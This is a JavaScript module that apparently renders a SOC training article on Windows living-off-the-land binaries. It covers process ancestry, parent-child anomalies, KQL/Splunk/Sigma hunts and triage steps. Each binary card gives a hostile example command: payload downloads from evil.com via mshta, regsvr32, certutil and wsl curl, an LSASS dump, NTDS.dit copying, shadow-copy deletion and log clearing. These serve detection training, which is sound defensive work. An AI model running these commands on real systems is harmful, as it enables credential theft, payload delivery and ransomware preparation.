// Windows Binaries, LOLBAs & Process Analysis — SOC training-grade deep dive.
// Rendered natively at /blog/windows-lolbas-360.
// Hidden from the landing preview (only accessible via direct link or /blog listing).

// Rich LOLBIN reference — each entry drives a per-binary card in the article.
const LOLBINS = [
  {
    name: "cmd.exe",
    purpose: "Command prompt · run batch scripts and internal commands.",
    abuse: "Execute malicious payloads, decode base64, disable AV, write registry persistence.",
    example: "cmd /c echo [base64] | certutil -decode - payload.exe",
    mitre: ["T1059.003 Command and Scripting Interpreter: Windows Command Shell"],
    detect: [
      "Sysmon Event 1: alert on cmd.exe spawned by Office, browsers or PDF readers.",
      "Alert on /c flag followed by encoded strings, download tools or LOLBins.",
      "Detect caret (^) obfuscation with regex c[\\^]?m[\\^]?d.",
    ],
  },
  {
    name: "powershell.exe / pwsh.exe",
    purpose: "PowerShell console for scripting and administration.",
    abuse: "Encoded commands, fileless execution, AMSI bypass, download cradles, profile manipulation.",
    example: "powershell.exe -NoP -Non -W Hidden -Exec Bypass -Enc <base64>",
    mitre: ["T1059.001 Command and Scripting Interpreter: PowerShell"],
    detect: [
      "Enable Script Block Logging (4104), Module Logging (4103), Transcription.",
      "Alert on -enc / -EncodedCommand, -exec bypass, -nop, -w hidden combinations.",
      "Alert on PowerShell spawned by Office, browsers or unusual parents.",
      "Alert on Net.WebClient, WebRequest, BitsTransfer, Invoke-Expression (IEX), IWR.",
      "Detect PowerShell v2 usage — bypasses Script Block Logging.",
    ],
  },
  {
    name: "wscript.exe / cscript.exe",
    purpose: "Windows Script Host — runs VBScript / JScript (.vbs, .js, .wsf).",
    abuse: "VBScript/JScript droppers, JS loaders, WSF polyglots, spawn child processes.",
    example: `wscript.exe payload.vbs   (CreateObject("WScript.Shell").Run("cmd /c ..."))`,
    mitre: ["T1059.005 VBScript", "T1059.007 JavaScript"],
    detect: [
      "Sysmon Event 1: monitor .vbs / .js executed from %TEMP% or %APPDATA%.",
      "Alert on wscript.exe / cscript.exe spawned by Office applications.",
    ],
  },
  {
    name: "mshta.exe",
    purpose: "Execute .hta (HTML Application) files using HTML/VBScript/JScript.",
    abuse: "Download and execute HTA from URL, inline obfuscated scripts, command shell chain.",
    example: "mshta.exe http://evil.com/payload.hta",
    mitre: ["T1218.005 Signed Binary Proxy Execution: Mshta"],
    detect: [
      "Detect mshta.exe with HTTP/HTTPS URL arguments.",
      "Detect mshta.exe spawned by Office apps or explorer with unusual arguments.",
      "Monitor child processes of mshta.exe (cmd.exe, powershell.exe, wscript.exe).",
    ],
  },
  {
    name: "rundll32.exe",
    purpose: "Load and execute a function exported from a DLL.",
    abuse: "Execute attacker DLL, run cmd via shell32.dll, dump LSASS via comsvcs.dll MiniDump, Cobalt Strike spawn-to.",
    example: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <PID> C:\\Temp\\lsass.dmp full",
    mitre: ["T1218.011 Signed Binary Proxy Execution: Rundll32", "T1003.001 LSASS Memory"],
    detect: [
      "Sysmon Event 1 + Event 10 (ProcessAccess) for LSASS handle grants.",
      "Detect rundll32.exe with comsvcs.dll and MiniDump in command line — critical alert.",
      "Monitor for suspicious DLLs loaded from %TEMP%, %APPDATA% or user-writable dirs.",
    ],
  },
  {
    name: "regsvr32.exe (Squiblydoo)",
    purpose: "Register / unregister COM DLLs and ActiveX controls.",
    abuse: "Execute remote COM scriptlet via /i:URL to bypass AppLocker (Squiblydoo).",
    example: "regsvr32 /s /n /u /i:http://evil.com/a.sct scrobj.dll",
    mitre: ["T1218.010 Signed Binary Proxy Execution: Regsvr32"],
    detect: [
      "Detect regsvr32.exe with /i flag pointing to a URL.",
      "Monitor for scrobj.dll loads combined with network egress.",
    ],
  },
  {
    name: "certutil.exe",
    purpose: "Certificate management · install/remove certs, encode/decode files.",
    abuse: "Download files from the internet, decode Base64 payloads, rename evasion.",
    example: "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Temp\\p.exe",
    mitre: ["T1105 Ingress Tool Transfer", "T1140 Deobfuscate/Decode Files or Information"],
    detect: [
      "-urlcache, -split, -decode are the high-fidelity flags to alert on.",
      "Exclude only known patch-management or PKI automation hosts.",
    ],
    criticalAlert: true,
  },
  {
    name: "bitsadmin.exe / BITS",
    purpose: "Background Intelligent Transfer Service — Windows Update download manager.",
    abuse: "Create BITS jobs to download malware and execute on completion — persistence across reboots.",
    example: "bitsadmin /create evil && bitsadmin /addfile evil http://evil.com/m.exe C:\\T\\m.exe && bitsadmin /SetNotifyCmdLine evil C:\\T\\m.exe NULL",
    mitre: ["T1197 BITS Jobs"],
    detect: [
      "Event Log: Microsoft-Windows-Bits-Client/Operational.",
      "PowerShell: Get-BitsTransfer -AllUsers to enumerate active/queued jobs.",
      "Alert on bitsadmin with SetNotifyCmdLine pointing to an executable.",
    ],
  },
  {
    name: "msiexec.exe",
    purpose: "Windows Installer — install/update/remove MSI packages.",
    abuse: "Download and silently install remote MSI; execute DLL via DllRegisterServer.",
    example: "msiexec /q /i http://evil.com/payload.msi",
    mitre: ["T1218.007 Signed Binary Proxy Execution: Msiexec"],
    detect: ["Monitor msiexec.exe downloading MSI from external URLs."],
  },
  {
    name: "wmic.exe",
    purpose: "WMI command line — query system info, manage processes/services.",
    abuse: "Lateral movement (process call create /node:), remote XSL execution, delete shadow copies.",
    example: `wmic /node:TARGET process call create "cmd /c whoami"`,
    mitre: ["T1047 Windows Management Instrumentation", "T1546.003 WMI Event Subscription"],
    detect: [
      "Sysmon Event 19/20/21: WmiEvent for filter/consumer/binding.",
      "Alert on wmic.exe with /node: targeting remote hosts.",
      "Detect WmiPrvSE.exe spawning cmd.exe or powershell.exe (WMI-driven exec).",
    ],
  },
  {
    name: "schtasks.exe / at.exe",
    purpose: "Schedule tasks to run at specific times or on events.",
    abuse: "Persistence (run at logon / interval), remote task creation for lateral movement.",
    example: `schtasks /create /tn "WindowsUpdate" /tr "C:\\Temp\\evil.exe" /sc onlogon /ru SYSTEM /f`,
    mitre: ["T1053.005 Scheduled Task/Job: Scheduled Task"],
    detect: [
      "Event IDs: 4698 (created), 4702 (updated), 4699 (deleted).",
      "Alert on tasks with /ru SYSTEM created by non-admin user processes.",
      "Alert on tasks whose /tr contains PowerShell -enc, certutil, mshta.",
      "Alert on tasks named to mimic Windows (WindowsUpdate, Telemetry, SvcHost).",
    ],
  },
  {
    name: "sc.exe",
    purpose: "Create, start, stop, query, and delete Windows services.",
    abuse: "Service-based persistence, remote service creation, disable Windows Defender.",
    example: `sc create EvilSvc binPath= "C:\\Temp\\evil.exe" start= auto`,
    mitre: ["T1543.003 Create or Modify System Process: Windows Service"],
    detect: [
      "Event 7045 (new service installed) + 4697 (security audit).",
      "Alert on new services whose binPath references user-writable paths.",
    ],
  },
  {
    name: "reg.exe / regedit.exe",
    purpose: "Modify the Windows Registry.",
    abuse: "Add Run keys for persistence, disable Defender, add AV exclusion paths.",
    example: "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Temp\\evil.exe /f",
    mitre: ["T1112 Modify Registry", "T1547.001 Registry Run Keys"],
    detect: [
      "Sysmon Event 13: RegistryEvent (Value Set).",
      "Alert on writes to Defender registry paths and Run/RunOnce keys.",
    ],
  },
  {
    name: "vssadmin.exe",
    purpose: "Manage Volume Shadow Copies from command line.",
    abuse: "Delete all shadow copies — the pre-encryption step of nearly every modern ransomware family.",
    example: "vssadmin.exe delete shadows /all /quiet",
    mitre: ["T1490 Inhibit System Recovery"],
    detect: [
      "Critical alert: Sysmon Event 1 CommandLine containing 'delete shadows'.",
      "Sigma rule: Shadow Copies Deletion Using OS Utilities.",
    ],
    criticalAlert: true,
  },
  {
    name: "wevtutil.exe",
    purpose: "Windows Event Log management — query, export, clear logs.",
    abuse: "Clear individual or all event logs to cover tracks post-compromise.",
    example: "wevtutil.exe cl Security",
    mitre: ["T1070.001 Indicator Removal: Clear Windows Event Logs"],
    detect: [
      "Event ID 1102 (Security cleared) and 104 (System cleared) fire at the moment of clearing.",
    ],
  },
  {
    name: "esentutl.exe",
    purpose: "Repair, copy, defrag ESE databases (Active Directory data store).",
    abuse: "NTDS.dit extraction while AD is running, alternative to certutil for file transfer.",
    example: "esentutl.exe /y \\\\DC\\C$\\Windows\\NTDS\\NTDS.dit /d C:\\Temp\\ntds.dit /o",
    mitre: ["T1105 Ingress Tool Transfer", "T1003.003 OS Credential Dumping: NTDS"],
    detect: ["Alert on esentutl.exe copying files, especially targeting NTDS.dit."],
  },
  {
    name: "msbuild.exe / csc.exe",
    purpose: "Compile & execute .proj XML files with inline C#/VB tasks; C# compiler.",
    abuse: "Execute embedded C# via MSBuild (AppLocker bypass), compile payloads on-target.",
    example: "msbuild.exe evil.proj",
    mitre: ["T1127.001 Trusted Developer Utilities Proxy Execution: MSBuild"],
    detect: ["Alert on msbuild.exe executing .proj files outside of dev workstations."],
  },
  {
    name: "installutil.exe",
    purpose: "Install / uninstall .NET application components.",
    abuse: "Execute payload via InstallUtil (AppLocker bypass) using an Uninstall() method.",
    example: "installutil.exe /logfile= /logtoconsole=false /U evil.exe",
    mitre: ["T1218.004 Signed Binary Proxy Execution: InstallUtil"],
    detect: ["Alert on installutil.exe with /U flag pointing to an executable."],
  },
  {
    name: "diskshadow.exe",
    purpose: "Interact with Volume Shadow Copy Service (VSS) via a script file.",
    abuse: "Expose a shadow copy to extract NTDS.dit or other locked files.",
    example: "diskshadow.exe /s C:\\Temp\\evil.dsh",
    mitre: ["T1003.003 OS Credential Dumping: NTDS", "T1218 Signed Binary Proxy Execution"],
    detect: ["Monitor diskshadow.exe scripts that create/expose shadow copies."],
  },
  {
    name: "bash.exe / wsl.exe (WSL)",
    purpose: "Full Linux environment inside Windows.",
    abuse: "Use Linux tools (curl, wget) to bypass Windows controls; execute ELF binaries; hide payloads under /root or /home (not scanned by Windows AV).",
    example: "wsl.exe curl http://evil.com/payload -o /mnt/c/temp/payload.exe",
    mitre: ["T1202 Indirect Command Execution"],
    detect: [
      "Detect bash.exe / wsl.exe spawning child processes with outbound network.",
      "Baseline WSL usage — flag anomalies in user context / off-hours.",
    ],
  },
];

// ---- Sections composed from the extracted training content --------------
const SECTIONS = [
  {
    heading: "Why this matters",
    body: [
      "Detecting advanced threats starts with an uncomfortable truth: nearly every modern intrusion abuses signed, trusted Windows binaries — not custom malware. Attackers now prefer to \"live off the land\" (LotL), using tools that Microsoft itself signs and ships. Signature-based AV is largely blind to this class of activity because there is no malicious file to fingerprint.",
      "This deep dive maps the 25+ most-abused Living-off-the-Land Binaries (LOLBAs), the parent-child process relationships that surface them, and the exact detection queries a modern SOC needs — MITRE ATT&CK mapped throughout.",
      "This is the same reference NivX analysts carry into 24×7 SOC operations. If you cannot define \"normal\" for your Windows fleet, you cannot detect \"malicious\".",
    ],
    callout: {
      tone: "info",
      title: "Companion reference",
      body: "For canonical examples and detection payloads for every binary listed here, cross-reference the community-maintained LOLBAS project at lolbas-project.github.io.",
    },
  },
  {
    heading: "The Windows process family — a mental model",
    body: [
      "Every Windows process descends from a small set of well-known parents. Deviations from this tree are the earliest and cheapest detection signal available — you don't need EDR to see them, just Windows Security Event 4688 with command-line auditing enabled, or Sysmon Event ID 1.",
    ],
    tree: {
      title: "Legitimate Windows process ancestry",
      nodes: [
        { p: "System (PID 4)", children: [
          { p: "smss.exe", label: "Session Manager", children: [
            { p: "csrss.exe", label: "Client-Server Runtime" },
            { p: "wininit.exe", label: "Init (session 0)", children: [
              { p: "services.exe", label: "SCM", children: [
                { p: "svchost.exe (x N)", label: "Grouped services" },
                { p: "msiexec.exe" },
                { p: "spoolsv.exe" },
              ]},
              { p: "lsass.exe", label: "Local Security Authority — no children expected" },
              { p: "lsm.exe" },
            ]},
            { p: "winlogon.exe", label: "Logon UI", children: [
              { p: "userinit.exe", children: [
                { p: "explorer.exe", label: "User shell", children: [
                  { p: "chrome.exe / winword.exe / …", label: "Legitimate apps" },
                ]},
              ]},
              { p: "LogonUI.exe" },
              { p: "dwm.exe" },
            ]},
          ]},
        ]},
      ],
    },
    body2: [],
    callout: {
      tone: "warn",
      title: "PPID Spoofing — the silent bypass",
      body: "Attackers can forge the parent PID via UpdateProcThreadAttribute so a malicious process appears to be a child of a benign one. Standard Sysmon configs will believe the spoof; only ETW-Ti or kernel callbacks (EDR) see the real parent. Assume PPID spoofing on any targeted intrusion.",
    },
  },
  {
    heading: "Suspicious parent-child combinations — the fastest wins",
    body: [
      "The single highest-signal rule set in any Windows SOC is: which parent-child pairs should never legitimately occur? These are our top-tier detection anchors — every one below is directly mappable to a MITRE ATT&CK technique.",
    ],
    table: {
      headers: ["Parent", "Child", "Attack technique", "ATT&CK"],
      rows: [
        ["mono:winword.exe",  "mono:cmd.exe",        "Office macro → command shell",     "T1059.003"],
        ["mono:winword.exe",  "mono:powershell.exe", "Macro → PowerShell payload",       "T1059.001"],
        ["mono:winword.exe",  "mono:wscript.exe",    "VBScript execution from macro",    "T1059.005"],
        ["mono:winword.exe",  "mono:mshta.exe",      "HTA execution from macro",         "T1218.005"],
        ["mono:excel.exe",    "mono:powershell.exe", "XLS macro → PowerShell",           "T1059.001"],
        ["mono:outlook.exe",  "mono:cmd.exe",        "Outlook rule / macro shell",       "T1059.003"],
        ["mono:powerpnt.exe", "mono:wscript.exe",    "Presentation macro",               "T1059.005"],
        ["mono:acrobat.exe",  "mono:cmd.exe",        "PDF exploit execution",            "T1203"],
        ["mono:iexplore.exe", "mono:cmd.exe",        "Browser exploit",                  "T1203"],
        ["mono:chrome.exe",   "mono:powershell.exe", "Extension / exploit",              "T1059.001"],
        ["mono:svchost.exe",  "mono:cmd.exe",        "Service spawning a shell",         "T1059.003"],
        ["mono:lsass.exe",    "mono:ANY",            "Credential dumping / injection",   "T1003"],
        ["mono:mshta.exe",    "mono:powershell.exe", "HTA → PowerShell chain",           "T1218.005"],
        ["mono:wscript.exe",  "mono:powershell.exe", "Script → PowerShell chain",        "T1059.001"],
        ["mono:regsvr32.exe", "mono:cmd.exe",        "Squiblydoo child shell",           "T1218.010"],
        ["mono:rundll32.exe", "mono:cmd.exe",        "DLL proxy → shell",                "T1218.011"],
        ["mono:WmiPrvSE.exe", "mono:cmd.exe",        "WMI lateral movement",             "T1047"],
        ["mono:spoolsv.exe",  "mono:cmd.exe/ps",     "PrintNightmare exploitation",      "CVE-2021-34527"],
      ],
    },
  },
  {
    heading: "Attack chain — phishing to shell in six hops",
    body: [
      "The chain below is the canonical Office-macro intrusion pattern we see in the wild. Every arrow here has a defensive counter above.",
    ],
    tree: {
      title: "Phishing → RCE process tree",
      nodes: [
        { p: "outlook.exe", label: "user opens phishing attachment", children: [
          { p: "winword.exe", suspect: true, label: "malicious .docm", children: [
            { p: "powershell.exe -NoP -W Hidden -Enc <b64>", suspect: true, label: "macro launches PowerShell", children: [
              { p: "cmd.exe /c certutil -urlcache -split -f …", suspect: true, label: "downloader stage", children: [
                { p: "payload.exe", suspect: true, label: "second stage", children: [
                  { p: "rundll32.exe comsvcs.dll MiniDump <lsass_pid>", suspect: true, label: "LSASS dump" },
                  { p: "vssadmin.exe delete shadows /all /quiet", suspect: true, label: "ransomware prep" },
                ]},
              ]},
            ]},
          ]},
        ]},
      ],
    },
    body2: [],
  },
  {
    heading: "LOLBIN reference — 20 binaries with detection playbooks",
    body: [
      "Each entry below lists the legitimate purpose, the attack pattern we observe, a concrete example command, the MITRE ATT&CK sub-techniques and the SOC detection steps.",
    ],
    // The LOLBIN cards are rendered as h3 + list blocks below.
    blocks: [].concat(
      ...LOLBINS.map((b) => [
        { type: "h3", text: b.name },
        { type: "p", text: `Legitimate purpose — ${b.purpose}` },
        { type: "p", text: `Malicious use — ${b.abuse}` },
        { type: "code", language: "example command", code: b.example },
        { type: "p", text: `MITRE ATT&CK — ${b.mitre.join(" · ")}` },
        { type: "list", items: b.detect.map((d) => ({ t: "Detect", d })) },
        ...(b.criticalAlert
          ? [{ type: "callout", tone: "danger", title: "Critical alert", body: `Use of ${b.name} in this pattern is high-confidence malicious. Treat as an incident until proven otherwise.` }]
          : []),
      ])
    ),
  },
  {
    heading: "SIEM hunt library — KQL, SPL and Sigma",
    body: [
      "Copy-paste-ready queries covering the highest-yield hunts. These sit at the top of the NivX SOC daily-triage playbook.",
    ],
    blocks: [
      { type: "h3", text: "Microsoft Defender for Endpoint · KQL — LOLBins with external network egress" },
      { type: "code", language: "kql", code:
`DeviceNetworkEvents
| where InitiatingProcessFileName in~ (
    "certutil.exe","mshta.exe","regsvr32.exe","rundll32.exe",
    "wscript.exe","cscript.exe","bitsadmin.exe","msiexec.exe",
    "installutil.exe","msbuild.exe")
| where RemoteIPType != "Private"
| project Timestamp, DeviceName, InitiatingProcessFileName,
          InitiatingProcessCommandLine, RemoteIP, RemoteUrl
| order by Timestamp desc` },
      { type: "h3", text: "KQL — Office spawning shell processes" },
      { type: "code", language: "kql", code:
`DeviceProcessEvents
| where InitiatingProcessFileName in~ (
    "WINWORD.EXE","EXCEL.EXE","OUTLOOK.EXE","POWERPNT.EXE",
    "MSPUB.EXE","MSACCESS.EXE")
| where FileName in~ (
    "cmd.exe","powershell.exe","wscript.exe","cscript.exe",
    "mshta.exe","regsvr32.exe","rundll32.exe")
| project Timestamp, DeviceName, InitiatingProcessFileName,
          FileName, ProcessCommandLine
| order by Timestamp desc` },
      { type: "h3", text: "Splunk SPL — encoded PowerShell hunt" },
      { type: "code", language: "spl", code:
`index=windows source="WinEventLog:Security" EventCode=4688
  ProcessName="*powershell*"
  (CommandLine="*-enc*" OR CommandLine="*-EncodedCommand*")
| eval decoded=base64decode(mvindex(split(CommandLine," "),-1))
| table _time, ComputerName, SubjectUserName, NewProcessName,
        ParentProcessName, CommandLine, decoded
| sort - _time` },
      { type: "h3", text: "Splunk SPL — ransomware pre-encryption indicators" },
      { type: "code", language: "spl", code:
`index=windows source="WinEventLog:Security" EventCode=4688
  (CommandLine="*vssadmin*delete*shadows*"
   OR CommandLine="*wmic*shadowcopy*delete*"
   OR CommandLine="*bcdedit*recoveryenabled*no*")
| table _time, ComputerName, SubjectUserName, CommandLine
| eval ALERT="RANSOMWARE INDICATOR - RESPOND IMMEDIATELY"
| sort - _time` },
      { type: "h3", text: "Sigma — certutil download from URL" },
      { type: "code", language: "yaml", code:
`title: Certutil Download From Remote URL
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\\certutil.exe'
    CommandLine|contains:
      - '-urlcache'
      - '-split'
      - 'http'
  condition: selection
level: high
tags:
  - attack.command_and_control
  - attack.t1105` },
      { type: "h3", text: "Sigma — Office application spawning shell process" },
      { type: "code", language: "yaml", code:
`title: Office Application Spawning Shell Process
status: stable
logsource:
  category: process_creation
  product: windows
detection:
  selection_parent:
    ParentImage|endswith:
      - '\\WINWORD.EXE'
      - '\\EXCEL.EXE'
      - '\\OUTLOOK.EXE'
      - '\\POWERPNT.EXE'
  selection_child:
    Image|endswith:
      - '\\cmd.exe'
      - '\\powershell.exe'
      - '\\wscript.exe'
      - '\\cscript.exe'
      - '\\mshta.exe'
      - '\\regsvr32.exe'
  condition: selection_parent and selection_child
level: critical
tags:
  - attack.t1566.001
  - attack.t1059` },
    ],
  },
  {
    heading: "Key Windows Event IDs to enable",
    table: {
      headers: ["Event ID", "Source", "Purpose"],
      rows: [
        ["mono:4688",  "Security",              "Process creation (enable command-line auditing)"],
        ["mono:4104",  "Microsoft-Windows-PowerShell/Operational", "Script Block Logging — deobfuscated PowerShell"],
        ["mono:4103",  "PowerShell/Operational","Module Logging — pipeline invocations"],
        ["mono:4697 / 7045", "Security / System", "Service installation"],
        ["mono:4698",  "Security",              "Scheduled task created"],
        ["mono:1102",  "Security",              "Audit log cleared"],
        ["mono:1",     "Sysmon",                "Process create (parent, cmdline, hashes)"],
        ["mono:3",     "Sysmon",                "Network connection"],
        ["mono:10",    "Sysmon",                "ProcessAccess (LSASS handle grants)"],
        ["mono:11",    "Sysmon",                "FileCreate"],
        ["mono:13",    "Sysmon",                "RegistryEvent (Value Set)"],
        ["mono:17 / 18","Sysmon",               "Named pipe create / connect (Cobalt Strike)"],
        ["mono:19 / 20 / 21", "Sysmon",         "WMI filter / consumer / binding"],
      ],
    },
  },
  {
    heading: "Analyst decision tree — the NivX 8-step triage SOP",
    list: [
      { t: "1 · WHAT ran?",        d: "Identify the binary. Is it a LOLBin? Is the image path the real System32 location?" },
      { t: "2 · WHO launched it?", d: "Which parent process spawned it? Is this parent-child combination normal in the environment?" },
      { t: "3 · HOW was it called?", d: "Full command line. Encoded args, URL arguments, obfuscation, unusual flags?" },
      { t: "4 · WHAT did it do?",  d: "Child processes spawned. Files written. Network connections. Registry changes. Named pipes." },
      { t: "5 · WHEN?",            d: "Timeline: first occurrence, part of a burst, off-hours execution, cross-host correlation." },
      { t: "6 · WHERE else?",      d: "Same pattern on other hosts? Lateral movement indicator or wider campaign?" },
      { t: "7 · WHY?",             d: "Any legitimate business reason? Verify with user or IT before closing." },
      { t: "8 · DECISION",         d: "TRUE POSITIVE → isolate + collect + IR ticket. FALSE POSITIVE → document + tune detection." },
    ],
  },
  {
    heading: "Containment checklist — first 60 minutes",
    list: [
      { t: "Isolate host", d: "EDR isolation mode or VLAN reassignment. Do not power off — preserves volatile evidence." },
      { t: "Capture memory", d: "WinPmem or DumpIt before any remediation. This is the only chance for in-memory implants." },
      { t: "Pull 72h of telemetry", d: "Sysmon Event 1 and Security Event 4688 for the affected host." },
      { t: "Check persistence", d: "Autoruns, schtasks /query, sc query, WMI event subscriptions, WMI __EventFilter/__EventConsumer." },
      { t: "Check lateral movement", d: "Event 4624 Type 3 from this host to any other host in the last 24h." },
      { t: "Network logs", d: "DNS queries, proxy logs, firewall egress for new external IPs / domains." },
      { t: "Hash & pivot", d: "Hash suspicious files. Search VirusTotal and internal threat intel. Pivot on prevalence." },
      { t: "Enterprise hunt", d: "Extract IOCs and YARA-hunt the same pattern across every endpoint before declaring contained." },
      { t: "Block at perimeter", d: "C2 IPs and domains at the firewall + internal DNS sinkhole." },
      { t: "Document everything", d: "Full timeline, IOCs to SIEM and TIP, hand-off notes for the day-2 responder." },
    ],
    callout: {
      tone: "danger",
      title: "Do not skip memory capture",
      body: "Every fileless implant we have investigated in the last 12 months was defeated by a clean memory dump captured before remediation. Once the host is rebooted, the payload is gone — and so is the intelligence.",
    },
  },
  {
    heading: "MITRE ATT&CK coverage summary",
    body: [
      "The techniques enumerated in this article map to the ATT&CK Enterprise matrix as follows. Coverage is intentionally biased toward Execution, Defence Evasion, Persistence, Credential Access and Impact — the phases most amplified by LOLBIN abuse.",
    ],
    table: {
      headers: ["Tactic", "Technique · sub-technique", "In this article"],
      rows: [
        ["Execution",            "mono:T1059.001 · PowerShell",                    "powershell.exe, encoded / bypass hunts"],
        ["Execution",            "mono:T1059.003 · Windows Command Shell",         "cmd.exe, forfiles"],
        ["Execution",            "mono:T1059.005 / .007 · VBScript / JavaScript",  "wscript.exe, cscript.exe"],
        ["Execution",            "mono:T1047 · Windows Management Instrumentation","wmic.exe lateral movement"],
        ["Execution",            "mono:T1053.005 · Scheduled Task",                "schtasks.exe"],
        ["Defence Evasion",      "mono:T1218.005 · Mshta",                         "mshta.exe URL / inline"],
        ["Defence Evasion",      "mono:T1218.010 · Regsvr32 (Squiblydoo)",         "regsvr32 /i URL"],
        ["Defence Evasion",      "mono:T1218.011 · Rundll32",                      "comsvcs.dll MiniDump"],
        ["Defence Evasion",      "mono:T1127.001 · MSBuild",                       "msbuild.exe evil.proj"],
        ["Defence Evasion",      "mono:T1070.001 · Clear Windows Event Logs",      "wevtutil cl"],
        ["Defence Evasion",      "mono:T1140 · Deobfuscate/Decode",                "certutil -decode"],
        ["Persistence",          "mono:T1547.001 · Registry Run Keys",             "reg add HKCU Run"],
        ["Persistence",          "mono:T1543.003 · Windows Service",               "sc create"],
        ["Persistence",          "mono:T1546.003 · WMI Event Subscription",        "WMI __EventFilter/__EventConsumer"],
        ["Persistence",          "mono:T1197 · BITS Jobs",                         "bitsadmin SetNotifyCmdLine"],
        ["Credential Access",    "mono:T1003.001 · LSASS Memory",                  "rundll32 comsvcs.dll MiniDump"],
        ["Credential Access",    "mono:T1003.003 · NTDS",                          "esentutl / diskshadow"],
        ["Command & Control",    "mono:T1105 · Ingress Tool Transfer",             "certutil -urlcache, bitsadmin"],
        ["Impact",               "mono:T1490 · Inhibit System Recovery",           "vssadmin delete shadows"],
        ["Initial Access",       "mono:T1566.001 · Spearphishing Attachment",      "Office macro chain"],
      ],
    },
  },
  {
    heading: "Where NivX takes it further",
    body: [
      "The reference above is the baseline every mature SOC must hold. Where NivX Machines adds leverage:",
    ],
    list: [
      { t: "Continuous LOLBIN telemetry", d: "Our SOC ingests Sysmon + 4688 + PowerShell 4104 by default and re-runs the entire hunt library nightly, so drift in your environment surfaces within 24 hours." },
      { t: "Purple-team validation", d: "Every detection rule we ship is validated against Atomic Red Team and Caldera before it earns a place in production. If it doesn't fire on the atomic, it doesn't ship." },
      { t: "IR retainer with tabletops", d: "We rehearse the phishing-to-shell chain (and 12 others) with your team quarterly so muscle memory is real, not aspirational." },
    ],
    callout: {
      tone: "info",
      title: "Get the NivX SOC baseline audit",
      body: "We'll benchmark your Windows event-log posture (4688 + PowerShell + Sysmon), score your detection coverage against every ATT&CK technique in this article, and hand back a prioritised gap list — usually within 5 business days. Reach out via the contact form below.",
    },
  },
];

// Cover image — Unsplash cybersecurity / terminal aesthetic to match the article tone.
const COVER = "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&w=1600&q=80";

export const WINDOWS_LOLBAS_360 = {
  slug: "windows-lolbas-360",
  title: "Windows Binaries, LOLBAs & Process Analysis — a SOC 360° reference",
  category: "SOC Playbook",
  excerpt:
    "The full NivX field reference for hunting Living-off-the-Land Binary abuse on Windows: 20 LOLBins with detection playbooks, parent-child process anomaly tables, KQL / Splunk / Sigma hunt queries, an 8-step analyst decision tree, containment checklist and MITRE ATT&CK coverage map.",
  date: "July 9, 2026",
  read_mins: 18,
  image: COVER,
  hidden_from_landing: true, // do NOT surface on Landing preview / master page
  sections: SECTIONS,
};
